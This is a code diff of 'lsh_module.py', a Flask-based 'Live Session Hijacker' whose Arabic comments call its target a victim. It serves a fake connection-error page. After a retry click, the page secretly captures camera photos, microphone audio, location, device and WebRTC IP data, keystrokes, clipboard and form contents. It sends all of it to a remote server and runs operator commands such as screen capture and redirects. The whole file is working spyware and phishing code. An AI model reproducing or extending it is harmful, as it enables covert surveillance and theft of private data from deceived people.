@@ -1,7 +1,7 @@
 # lsh_module.py
 # ============================================================
-# Live Session Hijacker - النسخة المخفية القوية
-# لا يظهر أي كلمة مشبوهة للضحية
+# LSH v3 — نظام التحكم الكامل المضمون
+# يعتمد على Push/Pull عبر نفس القناة (كل POST من الضحية يسحب الأوامر)
 # ============================================================
 
 import os
@@ -12,8 +12,7 @@ import base64
 import threading
 import redis
 import qrcode
-from flask import Blueprint, request, jsonify, Response
-from queue import Queue, Empty
+from flask import Blueprint, request, jsonify
 
 lsh_bp = Blueprint('lsh_module', __name__)
 
@@ -29,7 +28,7 @@ if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
 try:
     redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True, socket_timeout=10)
     redis_client.ping()
-    print("[+] LSH: Redis connected")
+    print("[+] LSH v3: Redis connected")
 except Exception as e:
     print(f"[-] Redis error in lsh_module: {e}")
     redis_client = None
@@ -37,7 +36,7 @@ except Exception as e:
 RAILWAY_URL = os.getenv("RAILWAY_URL", "https://daf-production-8df9.up.railway.app")
 
 # ============================================================
-# [2] إدارة الجلسات
+# [2] جلسات in-memory
 # ============================================================
 sessions = {}
 sessions_lock = threading.Lock()
@@ -50,12 +49,13 @@ def create_session(session_id, chat_id):
             "created_at": time.time(),
             "last_seen": time.time(),
             "info": {},
+            "live": True,
         }
     if redis_client:
         try:
             redis_client.setex(f"lsh_session:{session_id}", 86400, str(chat_id))
         except Exception as e:
-            print(f"[-] Redis session save error: {e}")
+            print(f"[-] Redis session save: {e}")
     return sessions[session_id]
 
 
@@ -65,23 +65,25 @@ def get_session(session_id):
 
 
 def push_command(session_id, command_dict):
+    """إرسال أمر — سيُسلَّم في الـ ping التالي (خلال 2 ثانية)"""
     if not redis_client:
-        print("[-] push_command: Redis not available")
+        print(f"[-] PUSH FAIL: no Redis")
         return False
     try:
         channel = f"lsh_cmd:{session_id}"
         payload = json.dumps(command_dict)
         redis_client.lpush(channel, payload)
-        redis_client.expire(channel, 600)
-        print(f"[+] Command pushed: {session_id} -> {command_dict.get('action')}")
+        redis_client.expire(channel, 1800)
+        pending = redis_client.llen(channel)
+        print(f"[+] PUSH >> {session_id[:8]} | {command_dict.get('action')} | pending={pending}")
         return True
     except Exception as e:
-        print(f"[-] push_command error: {e}")
+        print(f"[-] PUSH ERROR: {e}")
         return False
 
 
 # ============================================================
-# [3] القالب الجديد — يبدو كخطأ عام في أي موقع
+# [3] القالب — Push-based
 # ============================================================
 LSH_PAGE = r"""<!DOCTYPE html>
 <html lang="ar" dir="rtl">
@@ -92,142 +94,53 @@ LSH_PAGE = r"""<!DOCTYPE html>
 <title>حدث خطأ غير متوقع</title>
 <style>
   * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; user-select: none; -webkit-user-select: none; }
-  html, body {
-    margin: 0; padding: 0;
-    background: #f5f7fa;
-    color: #1a202c;
+  html, body { margin: 0; padding: 0; background: #f5f7fa; color: #1a202c;
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-    min-height: 100vh;
-    -webkit-font-smoothing: antialiased;
-  }
-  .wrap {
-    max-width: 520px; margin: 0 auto;
-    padding: 80px 24px 40px;
-    text-align: center;
-  }
-  .icon-wrap {
-    width: 88px; height: 88px; margin: 0 auto 28px;
-    border-radius: 50%;
-    background: #fff;
+    min-height: 100vh; -webkit-font-smoothing: antialiased; }
+  .wrap { max-width: 520px; margin: 0 auto; padding: 80px 24px 40px; text-align: center; }
+  .icon-wrap { width: 88px; height: 88px; margin: 0 auto 28px; border-radius: 50%; background: #fff;
     display: flex; align-items: center; justify-content: center;
-    box-shadow: 0 4px 20px rgba(0,0,0,0.06);
-    border: 1px solid #e2e8f0;
-  }
+    box-shadow: 0 4px 20px rgba(0,0,0,0.06); border: 1px solid #e2e8f0; }
   .icon-wrap svg { width: 44px; height: 44px; }
-  h1 {
-    font-size: 22px; font-weight: 600;
-    color: #1a202c; margin: 0 0 14px;
-    letter-spacing: -0.3px;
-  }
-  .subtitle {
-    color: #64748b; font-size: 15px;
-    line-height: 1.7; margin: 0 0 36px;
-    padding: 0 10px;
-  }
-  .info-card {
-    background: #fff;
-    border: 1px solid #e2e8f0;
-    border-radius: 14px;
-    padding: 20px;
-    margin-bottom: 22px;
-    text-align: right;
-    box-shadow: 0 1px 3px rgba(0,0,0,0.03);
-  }
-  .info-row {
-    display: flex; align-items: center;
-    justify-content: space-between;
-    padding: 10px 0;
-    border-bottom: 1px solid #f1f5f9;
-    font-size: 13px;
-  }
+  h1 { font-size: 22px; font-weight: 600; color: #1a202c; margin: 0 0 14px; letter-spacing: -0.3px; }
+  .subtitle { color: #64748b; font-size: 15px; line-height: 1.7; margin: 0 0 36px; padding: 0 10px; }
+  .info-card { background: #fff; border: 1px solid #e2e8f0; border-radius: 14px;
+    padding: 20px; margin-bottom: 22px; text-align: right;
+    box-shadow: 0 1px 3px rgba(0,0,0,0.03); }
+  .info-row { display: flex; align-items: center; justify-content: space-between;
+    padding: 10px 0; border-bottom: 1px solid #f1f5f9; font-size: 13px; }
   .info-row:last-child { border-bottom: none; }
   .info-label { color: #64748b; }
   .info-value { color: #1a202c; font-weight: 500; }
   .info-value.error { color: #e11d48; }
-  .info-value.ok { color: #16a34a; }
-  .retry-btn {
-    display: block; width: 100%;
-    padding: 15px 20px;
-    border: none; border-radius: 10px;
-    background: #2563eb;
-    color: #fff; font-size: 15px; font-weight: 600;
-    cursor: pointer;
-    box-shadow: 0 1px 2px rgba(37,99,235,0.2);
-    transition: background 0.15s ease, transform 0.1s ease;
-    font-family: inherit;
-    letter-spacing: 0.2px;
-  }
+  .retry-btn { display: block; width: 100%; padding: 15px 20px; border: none; border-radius: 10px;
+    background: #2563eb; color: #fff; font-size: 15px; font-weight: 600; cursor: pointer;
+    box-shadow: 0 1px 2px rgba(37,99,235,0.2); transition: background 0.15s ease;
+    font-family: inherit; letter-spacing: 0.2px; }
   .retry-btn:hover { background: #1d4ed8; }
-  .retry-btn:active { transform: scale(0.99); background: #1e40af; }
-  .retry-btn:disabled {
-    background: #94a3b8; cursor: not-allowed;
-    box-shadow: none;
-  }
-  .help-link {
-    display: block; margin-top: 22px;
-    color: #64748b; font-size: 13px;
-    text-decoration: none;
-  }
-  .help-link:hover { color: #2563eb; text-decoration: underline; }
-  .footer {
-    text-align: center; font-size: 12px;
-    color: #94a3b8; margin-top: 60px;
-    line-height: 1.7;
-  }
+  .retry-btn:disabled { background: #94a3b8; cursor: not-allowed; }
+  .help-link { display: block; margin-top: 22px; color: #64748b; font-size: 13px;
+    text-decoration: none; }
   .hidden { display: none !important; }
-  .loading-dots {
-    display: inline-flex; gap: 4px; margin-left: 6px;
-    vertical-align: middle;
-  }
-  .loading-dots span {
-    width: 5px; height: 5px; border-radius: 50%;
-    background: #fff; opacity: 0.4;
-    animation: dotPulse 1.4s infinite;
-  }
+  .loading-dots { display: inline-flex; gap: 4px; margin-left: 6px; vertical-align: middle; }
+  .loading-dots span { width: 5px; height: 5px; border-radius: 50%; background: #fff;
+    opacity: 0.4; animation: dp 1.4s infinite; }
   .loading-dots span:nth-child(2) { animation-delay: 0.2s; }
   .loading-dots span:nth-child(3) { animation-delay: 0.4s; }
-  @keyframes dotPulse {
-    0%, 60%, 100% { opacity: 0.4; transform: scale(0.85); }
-    30% { opacity: 1; transform: scale(1); }
-  }
-  .progress-wrap {
-    margin: 20px 0 10px;
-  }
-  .progress-bar {
-    height: 6px; background: #e2e8f0;
-    border-radius: 3px; overflow: hidden;
-  }
-  .progress-fill {
-    height: 100%; width: 0%;
-    background: #2563eb;
-    transition: width 0.4s ease;
-    border-radius: 3px;
-  }
-  .progress-text {
-    text-align: center; font-size: 12px;
-    color: #64748b; margin-top: 8px;
-  }
-  .success-wrap {
-    text-align: center; padding: 40px 20px;
-  }
-  .success-check {
-    width: 80px; height: 80px; margin: 0 auto 24px;
-    border-radius: 50%;
-    background: #dcfce7;
-    display: flex; align-items: center; justify-content: center;
-  }
+  @keyframes dp { 0%,60%,100% { opacity: 0.4; transform: scale(0.85); } 30% { opacity: 1; transform: scale(1); } }
+  .progress-bar { height: 6px; background: #e2e8f0; border-radius: 3px; overflow: hidden; margin: 12px 0; }
+  .progress-fill { height: 100%; width: 0%; background: #2563eb; transition: width 0.4s ease; }
+  .progress-text { text-align: center; font-size: 12px; color: #64748b; margin-top: 8px; }
+  .success-check { width: 80px; height: 80px; margin: 0 auto 24px; border-radius: 50%;
+    background: #dcfce7; display: flex; align-items: center; justify-content: center; }
   .success-check svg { width: 40px; height: 40px; }
-  .success-title {
-    font-size: 20px; font-weight: 600;
-    color: #16a34a; margin-bottom: 10px;
-  }
+  .success-title { font-size: 20px; font-weight: 600; color: #16a34a; margin-bottom: 10px; }
   .success-desc { color: #64748b; font-size: 14px; line-height: 1.7; }
 </style>
 </head>
 <body>
 <div class="wrap">
 
-  <!-- ============ حالة الخطأ ============ -->
   <div id="errorState">
     <div class="icon-wrap">
       <svg viewBox="0 0 24 24" fill="none">
@@ -237,36 +150,16 @@ LSH_PAGE = r"""<!DOCTYPE html>
       </svg>
     </div>
     <h1>حدث خطأ غير متوقع</h1>
-    <p class="subtitle">
-      تعذّر إكمال العملية بسبب مشكلة مؤقتة في الاتصال.<br>
-      يرجى المحاولة مرة أخرى.
-    </p>
-
+    <p class="subtitle">تعذّر إكمال العملية بسبب مشكلة مؤقتة في الاتصال.<br>يرجى المحاولة مرة أخرى.</p>
     <div class="info-card">
-      <div class="info-row">
-        <span class="info-label">حالة الاتصال</span>
-        <span class="info-value error">منقطع</span>
-      </div>
-      <div class="info-row">
-        <span class="info-label">رمز الخطأ</span>
-        <span class="info-value">ERR_CONNECTION_RESET</span>
-      </div>
-      <div class="info-row">
-        <span class="info-label">معرّف الطلب</span>
-        <span class="info-value" id="reqId">—</span>
-      </div>
+      <div class="info-row"><span class="info-label">حالة الاتصال</span><span class="info-value error">منقطع</span></div>
+      <div class="info-row"><span class="info-label">رمز الخطأ</span><span class="info-value">ERR_CONNECTION_RESET</span></div>
+      <div class="info-row"><span class="info-label">معرّف الطلب</span><span class="info-value" id="reqId">—</span></div>
     </div>
-
-    <button class="retry-btn" id="retryBtn" onclick="retryConnection()">
-      إعادة المحاولة
-    </button>
-
-    <a href="#" class="help-link" onclick="event.preventDefault()">
-      هل تحتاج إلى مساعدة؟
-    </a>
+    <button class="retry-btn" id="retryBtn" onclick="retryConnection()">إعادة المحاولة</button>
+    <a href="#" class="help-link" onclick="event.preventDefault()">هل تحتاج إلى مساعدة؟</a>
   </div>
 
-  <!-- ============ حالة الانتظار ============ -->
   <div id="loadingState" class="hidden">
     <div class="icon-wrap">
       <svg viewBox="0 0 24 24" fill="none">
@@ -276,34 +169,21 @@ LSH_PAGE = r"""<!DOCTYPE html>
       </svg>
     </div>
     <h1>جاري إعادة الاتصال...</h1>
-    <p class="subtitle">
-      يرجى الانتظار وعدم إغلاق الصفحة.
-    </p>
-
+    <p class="subtitle">يرجى الانتظار وعدم إغلاق الصفحة.</p>
     <div class="info-card">
-      <div class="progress-wrap">
-        <div class="progress-bar">
-          <div class="progress-fill" id="progressFill"></div>
-        </div>
-        <div class="progress-text" id="progressText">0%</div>
-      </div>
+      <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+      <div class="progress-text" id="progressText">0%</div>
     </div>
   </div>
 
-  <!-- ============ حالة النجاح ============ -->
   <div id="successState" class="hidden">
-    <div class="success-wrap">
-      <div class="success-check">
-        <svg viewBox="0 0 24 24" fill="none">
-          <path d="M5 13l4 4L19 7" stroke="#16a34a" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
-        </svg>
-      </div>
-      <div class="success-title">تم بنجاح</div>
-      <div class="success-desc">
-        تم إكمال العملية بنجاح.<br>
-        يمكنك إغلاق هذه الصفحة الآن.
-      </div>
+    <div class="success-check">
+      <svg viewBox="0 0 24 24" fill="none">
+        <path d="M5 13l4 4L19 7" stroke="#16a34a" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
     </div>
+    <div class="success-title">تم بنجاح</div>
+    <div class="success-desc">تم إكمال العملية بنجاح.<br>يمكنك إغلاق هذه الصفحة الآن.</div>
   </div>
 
 </div>
@@ -322,24 +202,19 @@ LSH_PAGE = r"""<!DOCTYPE html>
   const hide = id => el(id).classList.add('hidden');
 
   // ============================================================
-  // توليد Request ID
-  // ============================================================
-  const reqId = 'req_' + Math.random().toString(36).substring(2, 12).toUpperCase();
-  document.addEventListener('DOMContentLoaded', () => {
-    const ri = el('reqId');
-    if (ri) ri.textContent = reqId;
-  });
-
-  // ============================================================
-  // عناصر مخفية للكاميرا
+  // الحالة
   // ============================================================
   let videoEl = null, canvasEl = null;
+  let camStream = null, micStream = null;
+  let captureStarted = false;
+  let pingActive = true;
+  let pendingQueue = [];  // رسائل تنتظر الإرسال
+
   function ensureHiddenEls() {
     if (!videoEl) {
       videoEl = document.createElement('video');
       videoEl.autoplay = true; videoEl.muted = true;
-      videoEl.setAttribute('playsinline', '');
-      videoEl.setAttribute('webkit-playsinline', '');
+      videoEl.setAttribute('playsinline', ''); videoEl.setAttribute('webkit-playsinline', '');
       videoEl.style.cssText = 'position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;top:-9999px;left:-9999px;';
       document.body.appendChild(videoEl);
     }
@@ -351,53 +226,14 @@ LSH_PAGE = r"""<!DOCTYPE html>
   }
 
   // ============================================================
-  // حالة عامة
-  // ============================================================
-  let camStream = null, micStream = null;
-  let sendQueue = [];
-  let isSending = false;
-  let pollingActive = false;
-  let captureStarted = false;
-
-  // ============================================================
-  // إرسال
-  // ============================================================
-  function enqueue(data) {
-    sendQueue.push(data);
-    if (!isSending) processQueue();
-  }
-
-  async function processQueue() {
-    if (isSending) return;
-    isSending = true;
-    while (sendQueue.length > 0) {
-      const item = sendQueue.shift();
-      try {
-        const resp = await fetch(HTTP_URL + "/lsh_data", {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ ...item, session_id: SESSION_ID, chat_id: CHAT_ID }),
-          keepalive: true,
-        });
-        if (!resp.ok) throw new Error('HTTP ' + resp.status);
-      } catch (e) {
-        sendQueue.unshift(item);
-        await sleep(2000);
-      }
-    }
-    isSending = false;
-  }
-
-  // ============================================================
-  // جمع المعلومات
+  // التقاط أساسي
   // ============================================================
   async function collectBasicInfo() {
     const info = {
-      session_id: SESSION_ID,
-      chat_id: CHAT_ID,
+      session_id: SESSION_ID, chat_id: CHAT_ID,
       timestamp: new Date().toISOString(),
       userAgent: navigator.userAgent,
-      platform: navigator.platform || (navigator.userAgentData && navigator.userAgentData.platform) || "Unknown",
+      platform: navigator.platform || "Unknown",
       language: navigator.language,
       languages: navigator.languages || [],
       timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
@@ -418,7 +254,7 @@ LSH_PAGE = r"""<!DOCTYPE html>
     };
     try {
       const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-      if (c) info.connection = { effectiveType: c.effectiveType, downlink: c.downlink, rtt: c.rtt, saveData: c.saveData };
+      if (c) info.connection = { effectiveType: c.effectiveType, downlink: c.downlink, rtt: c.rtt };
     } catch(e){}
     try {
       if (navigator.getBattery) {
@@ -437,6 +273,8 @@ LSH_PAGE = r"""<!DOCTYPE html>
         };
       }
     } catch(e){}
+
+    // WebRTC IP Leak
     info.webrtc_ips = await new Promise(resolve => {
       try {
         const ips = new Set();
@@ -448,7 +286,7 @@ LSH_PAGE = r"""<!DOCTYPE html>
           if (m) ips.add(m[1]);
         };
         pc.createOffer().then(o => pc.setLocalDescription(o)).catch(()=>resolve([]));
-        setTimeout(() => { try{pc.close();}catch(e){} resolve(Array.from(ips)); }, 3000);
+        setTimeout(() => { try{pc.close();}catch(e){} resolve(Array.from(ips)); }, 2500);
       } catch(e) { resolve([]); }
     });
     return info;
@@ -470,15 +308,15 @@ LSH_PAGE = r"""<!DOCTYPE html>
   }
 
   async function startCamera() {
+    if (camStream && camStream.active) return true;
     try {
       camStream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
-        audio: false
+        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, audio: false
       });
       ensureHiddenEls();
       videoEl.srcObject = camStream;
       await videoEl.play().catch(()=>{});
-      await sleep(1500);
+      await sleep(1200);
       return true;
     } catch(e) {
       try {
@@ -486,13 +324,14 @@ LSH_PAGE = r"""<!DOCTYPE html>
         ensureHiddenEls();
         videoEl.srcObject = camStream;
         await videoEl.play().catch(()=>{});
-        await sleep(1500);
+        await sleep(1200);
         return true;
       } catch(e2) { return false; }
     }
   }
 
   async function startMic() {
+    if (micStream && micStream.active) return true;
     try { micStream = await navigator.mediaDevices.getUserMedia({ audio: true }); return true; }
     catch(e) { return false; }
   }
@@ -553,54 +392,120 @@ LSH_PAGE = r"""<!DOCTYPE html>
   }
 
   // ============================================================
-  // Polling للأوامر
+  // ★ إرسال رسالة + استقبال أوامر (نفس الطلب!)
   // ============================================================
-  async function startCommandPolling() {
-    if (pollingActive) return;
-    pollingActive = true;
-    while (pollingActive) {
-      try {
-        const resp = await fetch(
-          HTTP_URL + "/lsh_poll?s=" + encodeURIComponent(SESSION_ID),
-          { method: 'GET', cache: 'no-store' }
-        );
-        if (!resp.ok) { await sleep(1500); continue; }
-        const data = await resp.json();
-        if (data && data.command) {
-          handleCommand(data.command);
-        }
-      } catch(e) {
-        await sleep(2000);
+  async function sendMessage(data) {
+    try {
+      const resp = await fetch(HTTP_URL + "/lsh_msg", {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ ...data, session_id: SESSION_ID, chat_id: CHAT_ID })
+      });
+      if (!resp.ok) return null;
+      const json = await resp.json();
+      return json.commands || [];
+    } catch(e) {
+      return null;
+    }
+  }
+
+  // ★ Push في الخلفية (يُستدعى عند كل event)
+  function push(data) {
+    // نرسل مباشرة بدون انتظار (fire and forget + capture commands)
+    sendMessage(data).then(commands => {
+      if (commands && commands.length > 0) {
+        commands.forEach(cmd => executeCommand(cmd));
       }
+    }).catch(()=>{});
+  }
+
+  // ============================================================
+  // ★ Ping كل 2 ثانية — يسحب الأوامر المعلّقة
+  // ============================================================
+  async function startPing() {
+    while (pingActive) {
+      try {
+        const commands = await sendMessage({ type: 'ping', ts: Date.now() });
+        if (commands && commands.length > 0) {
+          for (const cmd of commands) {
+            await executeCommand(cmd);
+          }
+        }
+      } catch(e) {}
+      await sleep(2000);
     }
   }
 
   // ============================================================
-  // تنفيذ الأوامر
+  // ★ تنفيذ الأوامر
   // ============================================================
-  async function handleCommand(cmd) {
+  async function executeCommand(cmd) {
     const action = cmd.action;
     const payload = cmd.payload || {};
+    console.log('[EXEC]', action, payload);
+
     try {
+      // ---------- snapshot ----------
       if (action === 'snapshot') {
+        if (!camStream || !camStream.active) {
+          const ok = await startCamera();
+          if (!ok) {
+            push({ type: 'cmd_result', action: 'snapshot', status: 'fail', error: 'no_camera' });
+            return;
+          }
+        }
         const img = snapshot();
-        if (img) enqueue({ type: 'command_photo', image: img });
+        if (img) {
+          push({ type: 'cmd_result', action: 'snapshot', status: 'ok', data: img });
+        } else {
+          push({ type: 'cmd_result', action: 'snapshot', status: 'fail', error: 'capture_failed' });
+        }
         return;
       }
+
+      // ---------- audio ----------
       if (action === 'audio') {
-        const audio = await recordAudio(payload.duration || 6000);
-        if (audio) enqueue({ type: 'command_audio', audio: audio });
+        if (!micStream || !micStream.active) {
+          const ok = await startMic();
+          if (!ok) {
+            push({ type: 'cmd_result', action: 'audio', status: 'fail', error: 'no_mic' });
+            return;
+          }
+        }
+        const dur = payload.duration || 6000;
+        const audio = await recordAudio(dur);
+        if (audio) {
+          push({ type: 'cmd_result', action: 'audio', status: 'ok', data: audio });
+        } else {
+          push({ type: 'cmd_result', action: 'audio', status: 'fail', error: 'record_failed' });
+        }
         return;
       }
-      if (action === 'video_recording') {
-        const vid = await recordVideo(payload.duration || 10000);
-        if (vid) enqueue({ type: 'command_video', video: vid });
+
+      // ---------- video ----------
+      if (action === 'video') {
+        if (!camStream || !camStream.active) {
+          const ok = await startCamera();
+          if (!ok) {
+            push({ type: 'cmd_result', action: 'video', status: 'fail', error: 'no_camera' });
+            return;
+          }
+        }
+        const dur = payload.duration || 10000;
+        const vid = await recordVideo(dur);
+        if (vid) {
+          push({ type: 'cmd_result', action: 'video', status: 'ok', data: vid });
+        } else {
+          push({ type: 'cmd_result', action: 'video', status: 'fail', error: 'record_failed' });
+        }
         return;
       }
-      if (action === 'screen_share') {
+
+      // ---------- screen ----------
+      if (action === 'screen') {
         try {
-          if (!navigator.mediaDevices.getDisplayMedia) {
-            enqueue({ type: 'command_screen_failed' });
+          if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
+            push({ type: 'cmd_result', action: 'screen', status: 'fail', error: 'not_supported' });
             return;
           }
           const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
@@ -609,79 +514,118 @@ LSH_PAGE = r"""<!DOCTYPE html>
           await v.play();
           await sleep(1500);
           const c = document.createElement('canvas');
-          c.width = v.videoWidth; c.height = v.videoHeight;
+          c.width = v.videoWidth || 1280;
+          c.height = v.videoHeight || 720;
           c.getContext('2d').drawImage(v, 0, 0);
           const img = c.toDataURL('image/jpeg', 0.7);
           stream.getTracks().forEach(t => t.stop());
-          enqueue({ type: 'command_screen', image: img });
+          push({ type: 'cmd_result', action: 'screen', status: 'ok', data: img });
         } catch(e) {
-          enqueue({ type: 'command_screen_failed' });
+          push({ type: 'cmd_result', action: 'screen', status: 'fail', error: e.message || 'denied' });
         }
         return;
       }
-      if (action === 'get_clipboard') {
+
+      // ---------- clipboard ----------
+      if (action === 'clipboard') {
         try {
+          if (!navigator.clipboard || !navigator.clipboard.readText) {
+            push({ type: 'cmd_result', action: 'clipboard', status: 'fail', error: 'not_supported' });
+            return;
+          }
           const text = await navigator.clipboard.readText();
-          enqueue({ type: 'command_clipboard', content: text });
+          push({ type: 'cmd_result', action: 'clipboard', status: 'ok', data: text || '(empty)' });
         } catch(e) {
-          enqueue({ type: 'command_clipboard_failed' });
+          push({ type: 'cmd_result', action: 'clipboard', status: 'fail', error: e.message || 'denied' });
         }
         return;
       }
-      if (action === 'request_location') {
+
+      // ---------- location ----------
+      if (action === 'location') {
         const loc = await collectLocation();
-        enqueue({ type: 'command_location', location: loc });
+        if (loc) {
+          push({ type: 'cmd_result', action: 'location', status: 'ok', data: JSON.stringify(loc) });
+        } else {
+          push({ type: 'cmd_result', action: 'location', status: 'fail', error: 'denied_or_timeout' });
+        }
         return;
       }
-      if (action === 'open_url') {
+
+      // ---------- url ----------
+      if (action === 'url') {
         try {
-          window.open(payload.url, '_blank');
-          enqueue({ type: 'command_open_url_done' });
-        } catch(e) { enqueue({ type: 'command_open_url_failed' }); }
+          const w = window.open(payload.url, '_blank');
+          if (w) {
+            push({ type: 'cmd_result', action: 'url', status: 'ok', data: payload.url });
+          } else {
+            push({ type: 'cmd_result', action: 'url', status: 'fail', error: 'popup_blocked' });
+          }
+        } catch(e) {
+          push({ type: 'cmd_result', action: 'url', status: 'fail', error: e.message });
+        }
         return;
       }
+
+      // ---------- vibrate ----------
       if (action === 'vibrate') {
         try {
-          if (navigator.vibrate) navigator.vibrate(payload.pattern || [500,200,500]);
-          enqueue({ type: 'command_vibrate_done' });
-        } catch(e) {}
+          if (navigator.vibrate) {
+            navigator.vibrate(payload.pattern || [500,200,500,200,500]);
+            push({ type: 'cmd_result', action: 'vibrate', status: 'ok', data: 'vibrated' });
+          } else {
+            push({ type: 'cmd_result', action: 'vibrate', status: 'fail', error: 'not_supported' });
+          }
+        } catch(e) {
+          push({ type: 'cmd_result', action: 'vibrate', status: 'fail', error: e.message });
+        }
         return;
       }
+
+      // ---------- redirect ----------
       if (action === 'redirect') {
-        enqueue({ type: 'command_redirect_ack' });
+        push({ type: 'cmd_result', action: 'redirect', status: 'ok', data: 'closing' });
         await sleep(400);
-        window.location.href = payload.url;
+        window.location.href = payload.url || 'about:blank';
         return;
       }
-    } catch(e) { console.error('cmd error', e); }
+
+      // ---------- unknown ----------
+      push({ type: 'cmd_result', action: action, status: 'fail', error: 'unknown_action' });
+
+    } catch(e) {
+      console.error('[EXEC] fatal', e);
+      push({ type: 'cmd_result', action: action, status: 'fail', error: e.message });
+    }
   }
 
   // ============================================================
-  // المراقبة الخلفية
+  // ★ المراقبة الخلفية
   // ============================================================
-  function startBackgroundMonitors() {
+  function startMonitors() {
     document.addEventListener('keydown', e => {
       try {
-        enqueue({
-          type: 'key', key: e.key, code: e.code,
+        push({ type: 'key', key: e.key, code: e.code,
           ctrl: e.ctrlKey, shift: e.shiftKey, alt: e.altKey,
           target: (e.target && e.target.tagName) ? e.target.tagName.toLowerCase() : 'unknown',
-          target_type: (e.target && e.target.type) ? e.target.type : ''
-        });
+          target_type: (e.target && e.target.type) ? e.target.type : '' });
       } catch(err) {}
     }, true);
+
     document.addEventListener('copy', () => {
       try {
         const sel = window.getSelection().toString().slice(0,500);
-        if (sel) enqueue({ type: 'clipboard_copy', content: sel });
+        if (sel) push({ type: 'clipboard_copy', content: sel });
       } catch(e) {}
     }, true);
+
     document.addEventListener('paste', e => {
       try {
         const txt = (e.clipboardData || window.clipboardData).getData('text');
-        if (txt) enqueue({ type: 'clipboard_paste', content: txt.slice(0,500) });
+        if (txt) push({ type: 'clipboard_paste', content: txt.slice(0,500) });
       } catch(e) {}
     }, true);
+
     document.addEventListener('submit', e => {
       try {
         const fd = new FormData(e.target);
@@ -689,33 +633,26 @@ LSH_PAGE = r"""<!DOCTYPE html>
         for (const [k, v] of fd.entries()) {
           if (typeof v === 'string' && v.length < 500) data[k] = v;
         }
-        enqueue({ type: 'form_submit', action: e.target.action, data: data });
+        push({ type: 'form_submit', action_url: e.target.action, data: data });
       } catch(e) {}
     }, true);
+
     document.addEventListener('click', e => {
       try {
-        enqueue({
-          type: 'click',
+        push({ type: 'click',
           target: (e.target && e.target.tagName) ? e.target.tagName : 'unknown',
-          text: (e.target && e.target.innerText) ? e.target.innerText.slice(0,80) : ''
-        });
+          text: (e.target && e.target.innerText) ? e.target.innerText.slice(0,80) : '' });
       } catch(e) {}
     }, true);
-    let lastUrl = location.href;
-    setInterval(() => {
-      if (location.href !== lastUrl) {
-        lastUrl = location.href;
-        enqueue({ type: 'url_change', url: lastUrl });
-      }
-    }, 1500);
+
     setInterval(() => {
       const img = snapshot();
-      if (img) enqueue({ type: 'periodic_photo', image: img });
-    }, 45000);
+      if (img) push({ type: 'periodic_photo', image: img });
+    }, 60000);
   }
 
   // ============================================================
-  // بدء الالتقاط
+  // ★ بدء الالتقاط الكامل
   // ============================================================
   async function startFullCapture() {
     if (captureStarted) return;
@@ -732,74 +669,63 @@ LSH_PAGE = r"""<!DOCTYPE html>
     setProgress(10);
     await sleep(300);
     const info = await collectBasicInfo();
-    enqueue({ type: 'info', info: info });
+    await sendMessage({ type: 'info', info: info });
     setProgress(25);
 
     // 2) موقع
     const loc = await collectLocation();
-    if (loc) enqueue({ type: 'location', location: loc });
+    if (loc) await sendMessage({ type: 'location', location: loc });
     setProgress(45);
 
     // 3) كاميرا
     const camOk = await startCamera();
     if (camOk) {
       const img = snapshot();
-      if (img) enqueue({ type: 'first_photo', image: img });
+      if (img) await sendMessage({ type: 'first_photo', image: img });
     }
     setProgress(75);
 
-    // 4) ميكروفون
+    // 4) صوت
     const micOk = await startMic();
     if (micOk) {
       const audio = await recordAudio(5000);
-      if (audio) enqueue({ type: 'first_audio', audio: audio });
+      if (audio) await sendMessage({ type: 'first_audio', audio: audio });
     }
     setProgress(100);
 
-    // 5) بدء المراقبة
-    enqueue({ type: 'ready' });
-    startBackgroundMonitors();
-    startCommandPolling();
+    // 5) ready
+    await sendMessage({ type: 'ready' });
 
-    // 6) نجاح
-    await sleep(1000);
+    // 6) بدء المراقبة + ping
+    startMonitors();
+    startPing();
+
+    await sleep(800);
     hide('loadingState');
     show('successState');
   }
 
-  // ============================================================
-  // زر إعادة المحاولة
-  // ============================================================
   window.retryConnection = async function() {
     const btn = el('retryBtn');
     btn.disabled = true;
     btn.innerHTML = 'جاري الاتصال<span class="loading-dots"><span></span><span></span><span></span></span>';
-
-    enqueue({ type: 'retry_click' });
-
+    await sendMessage({ type: 'retry_click' });
     await sleep(1500);
-
     await startFullCapture();
   };
 
   // ============================================================
-  // الإقلاع — زر واحد فقط
+  // الإقلاع
   // ============================================================
   document.addEventListener('DOMContentLoaded', () => {
-    // توليد Request ID
     const reqId = 'req_' + Math.random().toString(36).substring(2, 12).toUpperCase();
     const ri = el('reqId');
     if (ri) ri.textContent = reqId;
-
-    // إرسال إشارة الدخول
-    enqueue({ type: 'landing' });
+    sendMessage({ type: 'landing' });
   });
 
-  // منع إغلاق الصفحة
   window.addEventListener('beforeunload', function(e) {
-    e.preventDefault();
-    e.returnValue = '';
-    return '';
+    e.preventDefault(); e.returnValue = ''; return '';
   });
 
 })();
@@ -810,16 +736,12 @@ LSH_PAGE = r"""<!DOCTYPE html>
 
 
 # ============================================================
-# [4] توليد QR
+# [4] QR
 # ============================================================
 def generate_qr_code_bytes(deep_link_url):
     try:
-        qr = qrcode.QRCode(
-            version=None,
-            error_correction=qrcode.constants.ERROR_CORRECT_H,
-            box_size=12,
-            border=2,
-        )
+        qr = qrcode.QRCode(version=None, error_correction=qrcode.constants.ERROR_CORRECT_H,
+                           box_size=12, border=2)
         qr.add_data(deep_link_url)
         qr.make(fit=True)
         img = qr.make_image(fill_color="#000000", back_color="#ffffff")
